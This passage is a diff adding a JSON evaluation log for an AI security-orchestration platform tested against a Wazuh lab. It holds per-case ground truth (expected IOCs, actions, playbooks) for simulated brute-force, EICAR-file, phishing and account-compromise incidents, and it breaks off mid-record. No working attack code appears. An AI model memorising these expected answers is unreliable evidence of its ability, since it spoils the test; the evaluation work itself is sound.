@@ -1,0 +1,2033 @@
+{
+  "runLabel": "ext-rag-off-20261001",
+  "mode": "clean",
+  "evaluationType": "REAL_WAZUH",
+  "startedAt": "2026-10-01T05:41:02.908Z",
+  "finishedAt": "2026-10-01T06:07:04.638Z",
+  "groundTruthFrozenAt": "2026-10-01T05:40:55.997Z",
+  "groundTruthSha256": "ddb18d5d4dee4ffe32730474b5a227a256ddd9c20805a83fbad4c94a81e64056",
+  "groundTruthSource": "apps/backend/src/evaluation/groundTruthReal.ts",
+  "decisionMode": "approve",
+  "infrastructureEvents": [
+    {
+      "case": "TC-01",
+      "stage": "ai-analysis",
+      "at": "2026-10-01T05:41:56.237Z",
+      "detail": "LLM endpoint unreachable, recovered",
+      "waitedSeconds": 16,
+      "recovered": true
+    },
+    {
+      "case": "TC-02",
+      "stage": "ai-analysis",
+      "at": "2026-10-01T05:43:24.706Z",
+      "detail": "LLM endpoint unreachable, recovered",
+      "waitedSeconds": 15,
+      "recovered": true
+    },
+    {
+      "case": "TC-02",
+      "stage": "recommendation-generation",
+      "at": "2026-10-01T05:46:08.341Z",
+      "detail": "AI_UNAVAILABLE (LLM endpoint timeout / connection error)",
+      "waitedSeconds": null,
+      "recovered": null
+    },
+    {
+      "case": "TC-03",
+      "stage": "recommendation-generation",
+      "at": "2026-10-01T05:49:32.719Z",
+      "detail": "LLM endpoint unreachable, recovered",
+      "waitedSeconds": 16,
+      "recovered": true
+    },
+    {
+      "case": "TC-03",
+      "stage": "recommendation-generation",
+      "at": "2026-10-01T05:51:18.511Z",
+      "detail": "LLM endpoint unreachable, recovered",
+      "waitedSeconds": 38,
+      "recovered": true
+    },
+    {
+      "case": "TC-04",
+      "stage": "ai-analysis",
+      "at": "2026-10-01T05:54:06.047Z",
+      "detail": "LLM endpoint unreachable, recovered",
+      "waitedSeconds": 16,
+      "recovered": true
+    },
+    {
+      "case": "TC-06",
+      "stage": "ai-analysis",
+      "at": "2026-10-01T05:55:42.042Z",
+      "detail": "LLM endpoint unreachable, recovered",
+      "waitedSeconds": 15,
+      "recovered": true
+    },
+    {
+      "case": "TC-07",
+      "stage": "ai-analysis",
+      "at": "2026-10-01T05:57:06.015Z",
+      "detail": "LLM endpoint unreachable, recovered",
+      "waitedSeconds": 16,
+      "recovered": true
+    },
+    {
+      "case": "TC-07",
+      "stage": "recommendation-generation",
+      "at": "2026-10-01T05:58:17.811Z",
+      "detail": "AI_UNAVAILABLE (LLM endpoint timeout / connection error)",
+      "waitedSeconds": null,
+      "recovered": null
+    },
+    {
+      "case": "TC-08",
+      "stage": "ai-analysis",
+      "at": "2026-10-01T06:00:26.558Z",
+      "detail": "LLM endpoint unreachable, recovered",
+      "waitedSeconds": 16,
+      "recovered": true
+    },
+    {
+      "case": "TC-08",
+      "stage": "recommendation-generation",
+      "at": "2026-10-01T06:02:03.202Z",
+      "detail": "LLM endpoint unreachable, recovered",
+      "waitedSeconds": 16,
+      "recovered": true
+    },
+    {
+      "case": "TC-08",
+      "stage": "recommendation-generation",
+      "at": "2026-10-01T06:03:33.974Z",
+      "detail": "LLM endpoint unreachable, recovered",
+      "waitedSeconds": 15,
+      "recovered": true
+    },
+    {
+      "case": "TC-10",
+      "stage": "ai-analysis",
+      "at": "2026-10-01T06:06:20.058Z",
+      "detail": "LLM endpoint unreachable, recovered",
+      "waitedSeconds": 15,
+      "recovered": true
+    }
+  ],
+  "scoring": "deterministic (EvaluationService.evaluateCompliance) — no LLM judge",
+  "preflight": {
+    "checks": [
+      {
+        "name": "evaluation database",
+        "ok": true,
+        "detail": "connected to 'soar_ext_eval' (must end with _eval; soar_platform is never touched)"
+      },
+      {
+        "name": "REHUNT_PROVIDER",
+        "ok": true,
+        "detail": "REHUNT_PROVIDER=wazuh — mock would make verification MOCK"
+      },
+      {
+        "name": "recommendation agent",
+        "ok": true,
+        "detail": "RECOMMENDATION_AGENT=llm (harness always builds LlmRecommendationAgent)"
+      },
+      {
+        "name": "AI orchestrator (eval instance)",
+        "ok": true,
+        "detail": "http://localhost:8001 -> {\"status\":\"ok\",\"service\":\"soar-ai-orchestrator\"}"
+      },
+      {
+        "name": "Wazuh Indexer + re-hunt provider",
+        "ok": true,
+        "detail": "WazuhRehuntAdapter health: reachable=true cluster=green indices=3 pattern=wazuh-alerts-4.x-*"
+      },
+      {
+        "name": "Wazuh manager API",
+        "ok": true,
+        "detail": "UP: analysisd, remoted, logcollector, integratord running · agents 1 active / 4 total (3 disconnected)"
+      },
+      {
+        "name": "Wazuh agent attack-endpoint",
+        "ok": true,
+        "detail": "ID: 009, Name: attack-endpoint, IP: any, Active"
+      },
+      {
+        "name": "custom rule 100310 loaded",
+        "ok": true,
+        "detail": "wazuh-logtest on the manager"
+      },
+      {
+        "name": "custom rule 100320 loaded",
+        "ok": true,
+        "detail": "wazuh-logtest on the manager"
+      },
+      {
+        "name": "custom rule 100330 loaded",
+        "ok": true,
+        "detail": "wazuh-logtest on the manager"
+      },
+      {
+        "name": "custom rule 100340 loaded",
+        "ok": true,
+        "detail": "wazuh-logtest on the manager"
+      },
+      {
+        "name": "custom rule 100350 loaded",
+        "ok": true,
+        "detail": "wazuh-logtest on the manager"
+      },
+      {
+        "name": "Knowledge Base complete for ground truth",
+        "ok": true,
+        "detail": "11 playbooks, 26 MITRE techniques, 14 actions; all ground-truth references present"
+      }
+    ],
+    "kbGaps": [],
+    "env": {
+      "wazuhVersion": "WAZUH_VERSION=\"v4.9.2\" WAZUH_REVISION=\"40921\" WAZUH_TYPE=\"server\" ",
+      "wazuhAgent": "ID: 009, Name: attack-endpoint, IP: any, Active",
+      "wazuhManagerApi": {
+        "status": "UP",
+        "detail": "analysisd, remoted, logcollector, integratord running · agents 1 active / 4 total (3 disconnected)",
+        "latencyMs": 303
+      },
+      "indexer": {
+        "configured": true,
+        "reachable": true,
+        "indexPattern": "wazuh-alerts-4.x-*",
+        "clusterStatus": "green",
+        "alertIndices": 3
+      },
+      "aiOrchestrator": "http://localhost:8001",
+      "llm": {
+        "provider": "openrouter",
+        "model": "google/gemma-4-26b-a4b-it",
+        "note": "LLM_PROVIDER is defined twice in apps/ai-orchestrator/.env (openai-compatible, then openrouter); the last value is assumed to win"
+      },
+      "database": "soar_ext_eval",
+      "verificationModeConfigured": "REAL_WAZUH (REHUNT_PROVIDER=wazuh)",
+      "recommendationAgent": "llm",
+      "node": "v24.19.0"
+    }
+  },
+  "labSetup": [
+    "attacker=172.19.0.6 endpoint=172.19.0.5 testserver=172.19.0.7"
+  ],
+  "cases": [
+    {
+      "caseId": "TC-01",
+      "attackType": "SSH_BRUTE_FORCE",
+      "attackName": "Brute Force",
+      "severity": "medium",
+      "risk": null,
+      "incidentId": "e5a306aa-a6f5-4064-9cab-76c64918bb16",
+      "alertId": "fd0c7726-6b91-4968-849d-17b0a143b83c",
+      "investigationId": "44d90bfe-bcb8-47ce-b60c-9b504d6dda4f",
+      "recommendationId": "acce41f6-dfdb-4ceb-9e37-fe12c3fa368a",
+      "playbookCode": "PB-SSH-BRUTEFORCE",
+      "decisionId": "dbfdee14-37d8-4111-85d7-3d0385efbcf6",
+      "responseTicketId": "a63a6873-a086-439c-b3d8-caae6dd17302",
+      "verificationId": "d1b6941b-7566-417e-984b-d752f1c998ba",
+      "recommendationStatus": "VALIDATED",
+      "compliance": {
+        "attackAlignment": true,
+        "evidenceSupport": true,
+        "knowledgeValidity": true,
+        "policyCompliance": true,
+        "playbookAlignment": true,
+        "approvalCorrectness": true,
+        "compliant": true,
+        "failedChecks": []
+      },
+      "recommendationCompliance": "COMPLIANT",
+      "investigationStartAt": "2026-10-01T05:41:32.688Z",
+      "recommendationAt": "2026-10-01T05:42:38.692Z",
+      "decisionAt": "2026-10-01T05:42:38.757Z",
+      "investigationTimeSeconds": 66,
+      "timeToDecisionSeconds": 0.07,
+      "workflow": {
+        "alertIngested": true,
+        "incidentCreated": true,
+        "aiAnalysisCompleted": true,
+        "investigationCompleted": true,
+        "recommendationCreated": true,
+        "recommendationValidated": true,
+        "policyEvaluated": true,
+        "decisionCompleted": true,
+        "responseCompleted": true,
+        "verificationCompleted": true,
+        "rehuntExecuted": true
+      },
+      "workflowCompleted": true,
+      "finalStatus": "resolved",
+      "verificationMode": "REAL_WAZUH",
+      "verificationResult": "RESOLVED",
+      "rehuntRound": 1,
+      "recommendationAttemptCount": 1,
+      "invalidOutputCount": 0,
+      "interventionRequired": false,
+      "interventionType": [],
+      "findings": [],
+      "notes": "",
+      "mode": "STOCK_RULE",
+      "telemetry": "REAL_EVENTS_STOCK_RULE",
+      "simulation": {
+        "caseId": "TC-01",
+        "startedAt": "2026-10-01T05:41:02.914Z",
+        "endedAt": "2026-10-01T05:41:32.611Z",
+        "telemetry": "REAL_EVENTS_STOCK_RULE",
+        "facts": {
+          "attackerIp": "172.19.0.6",
+          "endpointIp": "172.19.0.5",
+          "testServerIp": "172.19.0.7",
+          "usersTried": "admin,oracle,test,git,postgres,ubuntu,deploy,backup,user1,support"
+        },
+        "notes": []
+      },
+      "wazuh": {
+        "indexerDocId": "b6T79aABGgCGM5y0QkH5",
+        "alertId": "1790833276.213769",
+        "timestamp": "2026-10-01T05:41:16.076+0000",
+        "ruleId": "5712",
+        "level": 10,
+        "description": "sshd: brute force trying to get access to the system. Non existent user.",
+        "mitre": [
+          "T1110"
+        ],
+        "agent": "attack-endpoint",
+        "srcip": "172.19.0.6",
+        "stockRule": true,
+        "ruleMatch": true,
+        "levelMatch": true,
+        "mitreMatch": true,
+        "detectionLatencySeconds": 13.16
+      },
+      "groundTruth": {
+        "caseId": "TC-01",
+        "ruleId": "5712",
+        "attackName": "Brute Force",
+        "attackType": "SSH_BRUTE_FORCE",
+        "mode": "STOCK_RULE",
+        "simulation": "10 invalid-user SSH logins with wrong passwords, attacker container -> attack-endpoint sshd",
+        "expectedWazuh": {
+          "ruleId": "5712",
+          "level": 10,
+          "stockRule": true
+        },
+        "expectedSeverity": "medium",
+        "expectedMitre": [
+          "T1110"
+        ],
+        "expectedIocs": [
+          {
+            "type": "ip",
+            "value": "172.19.0.6"
+          },
+          {
+            "type": "user",
+            "value": "admin|oracle|test|git|postgres|ubuntu|deploy|backup|user1|support"
+          }
+        ],
+        "allowedActions": [
+          "ACT-BLOCK-SOURCE-IP",
+          "ACT-DISABLE-ACCOUNT"
+        ],
+        "expectedActions": [
+          "ACT-BLOCK-SOURCE-IP"
+        ],
+        "expectedTargets": [
+          "172.19.0.6"
+        ],
+        "expectedPlaybook": "PB-SSH-BRUTEFORCE",
+        "approvalExpected": true,
+        "expectedPolicy": "POL-A01 approval; POL-A02/A03 action compliance",
+        "expectedApproval": "IR_TEAM approval required (Policy POL-A01) before any containment; AI never approves",
+        "expectedVerification": "REAL_WAZUH re-hunt of the Wazuh Indexer after manual response: RESOLVED only if matchingEvents=0, no spread, no IOC recurrence, threatContained",
+        "knownFindings": []
+      },
+      "interventions": [],
+      "observations": [],
+      "timeline": {
+        "simulationStart": "2026-10-01T05:41:02.914Z",
+        "wazuhAlertTimestamp": "2026-10-01T05:41:16.076+0000",
+        "alertReceivedByVigix": "2026-10-01T05:41:32.644Z",
+        "incidentOpened": "2026-10-01T05:41:32.681Z",
+        "investigationStart": "2026-10-01T05:41:32.688Z",
+        "recommendationCreated": "2026-10-01T05:42:38.692Z",
+        "irDecision": "2026-10-01T05:42:38.757Z",
+        "responseCompleted": "2026-10-01T05:42:41.811Z",
+        "verificationAt": "2026-10-01T05:42:56.874Z",
+        "detectionLatencySeconds": 13.16,
+        "ingestToRecommendationSeconds": 66.06
+      },
+      "iocRecall": {
+        "expected": 2,
+        "found": 2,
+        "missing": []
+      },
+      "actionMatch": {
+        "expectedActions": [
+          "ACT-BLOCK-SOURCE-IP"
+        ],
+        "actualActions": [
+          "ACT-BLOCK-SOURCE-IP"
+        ],
+        "expectedActionHit": true,
+        "actualTargets": [
+          "172.19.0.6"
+        ],
+        "expectedTargetHit": true
+      },
+      "verificationDetail": {
+        "result": "RESOLVED",
+        "matchingEvents": 0,
+        "spreadDetected": false,
+        "iocRecurrence": false,
+        "threatContained": true,
+        "affectedHosts": [],
+        "index": "wazuh-alerts-4.x-*",
+        "evidenceSource": "WAZUH_INDEXER",
+        "searchedIocs": [
+          {
+            "type": "IPV4",
+            "value": "172.19.0.6"
+          }
+        ],
+        "skippedIocs": [],
+        "excludedIocs": [],
+        "window": {
+          "start": "2026-10-01T05:42:41.811Z",
+          "end": "2026-10-01T05:42:56.840Z"
+        }
+      },
+      "rehuntError": null,
+      "timingMode": "UNINTERRUPTED_SCRIPTED",
+      "environmentStatus": "AVAILABLE",
+      "irReject": null
+    },
+    {
+      "caseId": "TC-02",
+      "attackType": "MALWARE",
+      "attackName": "Malware",
+      "severity": "high",
+      "risk": null,
+      "incidentId": "6968dc6b-8b03-4ad6-8503-904c84a47718",
+      "alertId": "9386d8e9-1388-4a82-a4f0-bd9d55ab0acb",
+      "investigationId": "0572f006-1f4d-4a4a-9802-e03edfe41006",
+      "recommendationId": null,
+      "playbookCode": null,
+      "decisionId": null,
+      "responseTicketId": null,
+      "verificationId": null,
+      "recommendationStatus": null,
+      "compliance": null,
+      "recommendationCompliance": "NOT_EVALUATED",
+      "investigationStartAt": "2026-10-01T05:43:01.601Z",
+      "recommendationAt": null,
+      "decisionAt": null,
+      "investigationTimeSeconds": null,
+      "timeToDecisionSeconds": null,
+      "workflow": {
+        "alertIngested": true,
+        "incidentCreated": true,
+        "aiAnalysisCompleted": true,
+        "investigationCompleted": false,
+        "recommendationCreated": false,
+        "recommendationValidated": false,
+        "policyEvaluated": false,
+        "decisionCompleted": false,
+        "responseCompleted": false,
+        "verificationCompleted": false,
+        "rehuntExecuted": false
+      },
+      "workflowCompleted": false,
+      "finalStatus": "open",
+      "verificationMode": "NONE",
+      "verificationResult": null,
+      "rehuntRound": null,
+      "recommendationAttemptCount": 6,
+      "invalidOutputCount": 6,
+      "interventionRequired": false,
+      "interventionType": [],
+      "findings": [],
+      "notes": "",
+      "mode": "CUSTOM_RULE_REAL_ACTION",
+      "telemetry": "REAL_ACTION_CUSTOM_RULE",
+      "simulation": {
+        "caseId": "TC-02",
+        "startedAt": "2026-10-01T05:42:56.927Z",
+        "endedAt": "2026-10-01T05:42:57.347Z",
+        "telemetry": "REAL_ACTION_CUSTOM_RULE",
+        "facts": {
+          "attackerIp": "172.19.0.6",
+          "endpointIp": "172.19.0.5",
+          "testServerIp": "172.19.0.7",
+          "filePath": "/root/Downloads/Invoice_Q4_2026.xls.exe",
+          "expectedSha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+          "actualSha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
+        },
+        "notes": [
+          "EICAR is the industry-standard harmless AV test string, not malware."
+        ]
+      },
+      "wazuh": {
+        "indexerDocId": "gaT89aABGgCGM5y0zUGO",
+        "alertId": "1790833377.225034",
+        "timestamp": "2026-10-01T05:42:57.030+0000",
+        "ruleId": "100301",
+        "level": 12,
+        "description": "VIGIX-EVAL: executable dropped in a user Downloads folder (malware-like artifact)",
+        "mitre": [
+          "T1204.002"
+        ],
+        "agent": "attack-endpoint",
+        "srcip": null,
+        "stockRule": false,
+        "ruleMatch": true,
+        "levelMatch": true,
+        "mitreMatch": true,
+        "detectionLatencySeconds": 0.1
+      },
+      "groundTruth": {
+        "caseId": "TC-02",
+        "ruleId": "100301",
+        "attackName": "Malware",
+        "attackType": "MALWARE",
+        "mode": "CUSTOM_RULE_REAL_ACTION",
+        "simulation": "EICAR test string written to /root/Downloads/Invoice_Q4_2026.xls.exe (real file, real FIM hash)",
+        "expectedWazuh": {
+          "ruleId": "100301",
+          "level": 12,
+          "stockRule": false
+        },
+        "expectedSeverity": "high",
+        "expectedMitre": [
+          "T1204.002"
+        ],
+        "expectedIocs": [
+          {
+            "type": "hash",
+            "value": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
+          },
+          {
+            "type": "file",
+            "value": "/root/Downloads/Invoice_Q4_2026.xls.exe"
+          }
+        ],
+        "allowedActions": [
+          "ACT-ISOLATE-ENDPOINT",
+          "ACT-BLOCK-DOMAIN",
+          "ACT-BLOCK-URL",
+          "ACT-BLOCK-SOURCE-IP",
+          "ACT-KILL-PROCESS",
+          "ACT-QUARANTINE-FILE",
+          "ACT-BLOCK-HASH",
+          "ACT-BLOCK-DESTINATION-IP"
+        ],
+        "expectedActions": [
+          "ACT-QUARANTINE-FILE",
+          "ACT-BLOCK-HASH"
+        ],
+        "expectedTargets": [
+          "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+          "/root/Downloads/Invoice_Q4_2026.xls.exe",
+          "attack-endpoint"
+        ],
+        "expectedPlaybook": "PB-MALWARE",
+        "approvalExpected": true,
+        "expectedPolicy": "POL-A01 approval; impact-level policy for endpoint actions",
+        "expectedApproval": "IR_TEAM approval required (Policy POL-A01) before any containment; AI never approves",
+        "expectedVerification": "REAL_WAZUH re-hunt of the Wazuh Indexer after manual response: RESOLVED only if matchingEvents=0, no spread, no IOC recurrence, threatContained",
+        "knownFindings": []
+      },
+      "interventions": [],
+      "observations": [
+        "EXPECTED_IOC_MISSING (before any correction): hash:275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f, file:/root/Downloads/Invoice_Q4_2026.xls.exe",
+        "NO_VALID_RECOMMENDATION after 5 model attempts"
+      ],
+      "timeline": {
+        "simulationStart": "2026-10-01T05:42:56.927Z",
+        "wazuhAlertTimestamp": "2026-10-01T05:42:57.030+0000",
+        "alertReceivedByVigix": "2026-10-01T05:43:01.579Z",
+        "incidentOpened": "2026-10-01T05:43:01.595Z",
+        "investigationStart": "2026-10-01T05:43:01.601Z",
+        "recommendationCreated": null,
+        "irDecision": null,
+        "responseCompleted": null,
+        "verificationAt": null,
+        "detectionLatencySeconds": 0.1,
+        "ingestToRecommendationSeconds": null
+      },
+      "iocRecall": {
+        "expected": 2,
+        "found": 0,
+        "missing": [
+          "hash:275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+          "file:/root/Downloads/Invoice_Q4_2026.xls.exe"
+        ]
+      },
+      "actionMatch": null,
+      "verificationDetail": null,
+      "rehuntError": null,
+      "timingMode": "UNINTERRUPTED_SCRIPTED",
+      "environmentStatus": "AVAILABLE",
+      "irReject": null
+    },
+    {
+      "caseId": "TC-03",
+      "attackType": "PHISHING",
+      "attackName": "Phishing",
+      "severity": "medium",
+      "risk": null,
+      "incidentId": "847b4ac3-8833-48dc-beba-9da84dd1b4bd",
+      "alertId": "f5775685-2788-41a4-85ce-7a295fa1a7b0",
+      "investigationId": "aea93f85-8b23-42a2-8386-d7ecbc3de96f",
+      "recommendationId": null,
+      "playbookCode": null,
+      "decisionId": null,
+      "responseTicketId": null,
+      "verificationId": null,
+      "recommendationStatus": null,
+      "compliance": null,
+      "recommendationCompliance": "NOT_EVALUATED",
+      "investigationStartAt": "2026-10-01T05:46:58.643Z",
+      "recommendationAt": null,
+      "decisionAt": null,
+      "investigationTimeSeconds": null,
+      "timeToDecisionSeconds": null,
+      "workflow": {
+        "alertIngested": true,
+        "incidentCreated": true,
+        "aiAnalysisCompleted": true,
+        "investigationCompleted": false,
+        "recommendationCreated": false,
+        "recommendationValidated": false,
+        "policyEvaluated": false,
+        "decisionCompleted": false,
+        "responseCompleted": false,
+        "verificationCompleted": false,
+        "rehuntExecuted": false
+      },
+      "workflowCompleted": false,
+      "finalStatus": "open",
+      "verificationMode": "NONE",
+      "verificationResult": null,
+      "rehuntRound": null,
+      "recommendationAttemptCount": 5,
+      "invalidOutputCount": 5,
+      "interventionRequired": false,
+      "interventionType": [],
+      "findings": [],
+      "notes": "",
+      "mode": "CUSTOM_RULE_CONTROLLED_TELEMETRY",
+      "telemetry": "CONTROLLED_TELEMETRY_CUSTOM_RULE",
+      "simulation": {
+        "caseId": "TC-03",
+        "startedAt": "2026-10-01T05:46:46.336Z",
+        "endedAt": "2026-10-01T05:46:46.546Z",
+        "telemetry": "CONTROLLED_TELEMETRY_CUSTOM_RULE",
+        "facts": {
+          "attackerIp": "172.19.0.6",
+          "endpointIp": "172.19.0.5",
+          "testServerIp": "172.19.0.7"
+        },
+        "notes": [
+          "No e-mail was sent and no connection was made: controlled mail-gateway telemetry only."
+        ]
+      },
+      "wazuh": {
+        "indexerDocId": "iqQA9qABGgCGM5y0W0Gw",
+        "alertId": "1790833608.227656",
+        "timestamp": "2026-10-01T05:46:48.381+0000",
+        "ruleId": "100310",
+        "level": 10,
+        "description": "VIGIX-EVAL: phishing email with a credential-harvesting link delivered to a user mailbox",
+        "mitre": [
+          "T1566.002"
+        ],
+        "agent": "attack-endpoint",
+        "srcip": "203.0.113.45",
+        "stockRule": false,
+        "ruleMatch": true,
+        "levelMatch": true,
+        "mitreMatch": true,
+        "detectionLatencySeconds": 2.05
+      },
+      "groundTruth": {
+        "caseId": "TC-03",
+        "ruleId": "100310",
+        "attackName": "Phishing",
+        "attackType": "PHISHING",
+        "mode": "CUSTOM_RULE_CONTROLLED_TELEMETRY",
+        "simulation": "Controlled mail-gateway JSON event (no real e-mail, no real traffic): URL, domain, sender e-mail, sending MTA (RFC 5737 documentation IP)",
+        "expectedWazuh": {
+          "ruleId": "100310",
+          "level": 10,
+          "stockRule": false
+        },
+        "expectedSeverity": "medium",
+        "expectedMitre": [
+          "T1566.002"
+        ],
+        "expectedIocs": [
+          {
+            "type": "url",
+            "value": "http://vigix-eval-phish.net/o365/verify?id=hr.clerk"
+          },
+          {
+            "type": "domain",
+            "value": "vigix-eval-phish.net"
+          },
+          {
+            "type": "ip",
+            "value": "203.0.113.45"
+          },
+          {
+            "type": "email",
+            "value": "it-support@vigix-eval-phish.net"
+          }
+        ],
+        "allowedActions": [
+          "ACT-QUARANTINE-EMAIL",
+          "ACT-BLOCK-URL",
+          "ACT-BLOCK-DOMAIN",
+          "ACT-RESET-CREDENTIAL",
+          "ACT-REVOKE-SESSION",
+          "ACT-DISABLE-ACCOUNT",
+          "ACT-ISOLATE-ENDPOINT"
+        ],
+        "expectedActions": [
+          "ACT-BLOCK-URL",
+          "ACT-BLOCK-DOMAIN",
+          "ACT-QUARANTINE-EMAIL"
+        ],
+        "expectedTargets": [
+          "http://vigix-eval-phish.net/o365/verify?id=hr.clerk",
+          "vigix-eval-phish.net",
+          "it-support@vigix-eval-phish.net"
+        ],
+        "expectedPlaybook": "PB-PHISHING",
+        "approvalExpected": true,
+        "expectedPolicy": "POL-A01 approval",
+        "expectedApproval": "IR_TEAM approval required (Policy POL-A01) before any containment; AI never approves",
+        "expectedVerification": "REAL_WAZUH re-hunt of the Wazuh Indexer after manual response: RESOLVED only if matchingEvents=0, no spread, no IOC recurrence, threatContained",
+        "knownFindings": [],
+        "environmentNote": "ACT-QUARANTINE-EMAIL needs an evidence-backed EMAIL target; if the e-mail is not an IOC of the incident the case must be recorded as a finding/intervention, not silently repaired."
+      },
+      "interventions": [],
+      "observations": [
+        "NO_VALID_RECOMMENDATION after 5 model attempts"
+      ],
+      "timeline": {
+        "simulationStart": "2026-10-01T05:46:46.336Z",
+        "wazuhAlertTimestamp": "2026-10-01T05:46:48.381+0000",
+        "alertReceivedByVigix": "2026-10-01T05:46:58.613Z",
+        "incidentOpened": "2026-10-01T05:46:58.634Z",
+        "investigationStart": "2026-10-01T05:46:58.643Z",
+        "recommendationCreated": null,
+        "irDecision": null,
+        "responseCompleted": null,
+        "verificationAt": null,
+        "detectionLatencySeconds": 2.05,
+        "ingestToRecommendationSeconds": null
+      },
+      "iocRecall": {
+        "expected": 4,
+        "found": 4,
+        "missing": []
+      },
+      "actionMatch": null,
+      "verificationDetail": null,
+      "rehuntError": null,
+      "timingMode": "UNINTERRUPTED_SCRIPTED",
+      "environmentStatus": "AVAILABLE",
+      "irReject": null
+    },
+    {
+      "caseId": "TC-04",
+      "attackType": "ACCOUNT_COMPROMISE",
+      "attackName": "Account Compromise",
+      "severity": "high",
+      "risk": null,
+      "incidentId": "cf8ed1c6-86ee-43e1-9fb4-7b69f4d4ae5c",
+      "alertId": "c40238c2-43b3-4f88-91af-48c71975276d",
+      "investigationId": "7486abd5-cdc1-45f7-a9c6-c093e7a6eb3e",
+      "recommendationId": "1f4a6b17-870b-49cc-9bf2-9be847b9a2f5",
+      "playbookCode": "PB-ACCOUNT-COMPROMISE",
+      "decisionId": "8a94817a-dd00-4aaa-b431-0a7610f40131",
+      "responseTicketId": "49b1738b-5e74-4efc-9831-9165dec7d6eb",
+      "verificationId": "be377a86-3e5d-4945-bcd5-94a9fdafd77a",
+      "recommendationStatus": "VALIDATED",
+      "compliance": {
+        "attackAlignment": true,
+        "evidenceSupport": true,
+        "knowledgeValidity": true,
+        "policyCompliance": true,
+        "playbookAlignment": true,
+        "approvalCorrectness": true,
+        "compliant": true,
+        "failedChecks": []
+      },
+      "recommendationCompliance": "COMPLIANT",
+      "investigationStartAt": "2026-10-01T05:53:42.506Z",
+      "recommendationAt": "2026-10-01T05:54:47.923Z",
+      "decisionAt": "2026-10-01T05:54:47.985Z",
+      "investigationTimeSeconds": 65.42,
+      "timeToDecisionSeconds": 0.06,
+      "workflow": {
+        "alertIngested": true,
+        "incidentCreated": true,
+        "aiAnalysisCompleted": true,
+        "investigationCompleted": true,
+        "recommendationCreated": true,
+        "recommendationValidated": true,
+        "policyEvaluated": true,
+        "decisionCompleted": true,
+        "responseCompleted": true,
+        "verificationCompleted": true,
+        "rehuntExecuted": true
+      },
+      "workflowCompleted": true,
+      "finalStatus": "resolved",
+      "verificationMode": "REAL_WAZUH",
+      "verificationResult": "RESOLVED",
+      "rehuntRound": 1,
+      "recommendationAttemptCount": 1,
+      "invalidOutputCount": 0,
+      "interventionRequired": false,
+      "interventionType": [],
+      "findings": [
+        "(ground-truth note) Stock rule 40112 asserts BOTH T1078 and T1110. PlaybookSelector ties (one technique each) and breaks the tie on fewest-listed-techniques, then code order; ground truth expects PB-ACCOUNT-COMPROMISE (attack intent = compromised account)."
+      ],
+      "notes": "",
+      "mode": "STOCK_RULE",
+      "telemetry": "REAL_EVENTS_STOCK_RULE",
+      "simulation": {
+        "caseId": "TC-04",
+        "startedAt": "2026-10-01T05:53:04.375Z",
+        "endedAt": "2026-10-01T05:53:34.378Z",
+        "telemetry": "REAL_EVENTS_STOCK_RULE",
+        "facts": {
+          "attackerIp": "172.19.0.6",
+          "endpointIp": "172.19.0.5",
+          "testServerIp": "172.19.0.7",
+          "account": "victim"
+        },
+        "notes": []
+      },
+      "wazuh": {
+        "indexerDocId": "n6QG9qABGgCGM5y0hUHF",
+        "alertId": "1790834014.240078",
+        "timestamp": "2026-10-01T05:53:34.765+0000",
+        "ruleId": "40112",
+        "level": 12,
+        "description": "Multiple authentication failures followed by a success.",
+        "mitre": [
+          "T1078",
+          "T1110"
+        ],
+        "agent": "attack-endpoint",
+        "srcip": "172.19.0.6",
+        "stockRule": true,
+        "ruleMatch": true,
+        "levelMatch": true,
+        "mitreMatch": true,
+        "detectionLatencySeconds": 30.39
+      },
+      "groundTruth": {
+        "caseId": "TC-04",
+        "ruleId": "40112",
+        "attackName": "Account Compromise",
+        "attackType": "ACCOUNT_COMPROMISE",
+        "mode": "STOCK_RULE",
+        "simulation": "9 wrong-password SSH logins for user 'victim' then a successful login, attacker container -> attack-endpoint",
+        "expectedWazuh": {
+          "ruleId": "40112",
+          "level": 12,
+          "stockRule": true
+        },
+        "expectedSeverity": "high",
+        "expectedMitre": [
+          "T1078"
+        ],
+        "expectedIocs": [
+          {
+            "type": "ip",
+            "value": "172.19.0.6"
+          },
+          {
+            "type": "user",
+            "value": "victim"
+          }
+        ],
+        "allowedActions": [
+          "ACT-DISABLE-ACCOUNT",
+          "ACT-BLOCK-SOURCE-IP",
+          "ACT-ISOLATE-ENDPOINT",
+          "ACT-RESET-CREDENTIAL",
+          "ACT-REVOKE-SESSION"
+        ],
+        "expectedActions": [
+          "ACT-DISABLE-ACCOUNT",
+          "ACT-RESET-CREDENTIAL"
+        ],
+        "expectedTargets": [
+          "victim",
+          "172.19.0.6"
+        ],
+        "expectedPlaybook": "PB-ACCOUNT-COMPROMISE",
+        "approvalExpected": true,
+        "expectedPolicy": "POL-A01 approval",
+        "expectedApproval": "IR_TEAM approval required (Policy POL-A01) before any containment; AI never approves",
+        "expectedVerification": "REAL_WAZUH re-hunt of the Wazuh Indexer after manual response: RESOLVED only if matchingEvents=0, no spread, no IOC recurrence, threatContained",
+        "knownFindings": [
+          "Stock rule 40112 asserts BOTH T1078 and T1110. PlaybookSelector ties (one technique each) and breaks the tie on fewest-listed-techniques, then code order; ground truth expects PB-ACCOUNT-COMPROMISE (attack intent = compromised account)."
+        ]
+      },
+      "interventions": [],
+      "observations": [],
+      "timeline": {
+        "simulationStart": "2026-10-01T05:53:04.375Z",
+        "wazuhAlertTimestamp": "2026-10-01T05:53:34.765+0000",
+        "alertReceivedByVigix": "2026-10-01T05:53:42.447Z",
+        "incidentOpened": "2026-10-01T05:53:42.499Z",
+        "investigationStart": "2026-10-01T05:53:42.506Z",
+        "recommendationCreated": "2026-10-01T05:54:47.923Z",
+        "irDecision": "2026-10-01T05:54:47.985Z",
+        "responseCompleted": "2026-10-01T05:54:51.026Z",
+        "verificationAt": "2026-10-01T05:55:06.096Z",
+        "detectionLatencySeconds": 30.39,
+        "ingestToRecommendationSeconds": 65.5
+      },
+      "iocRecall": {
+        "expected": 2,
+        "found": 2,
+        "missing": []
+      },
+      "actionMatch": {
+        "expectedActions": [
+          "ACT-DISABLE-ACCOUNT",
+          "ACT-RESET-CREDENTIAL"
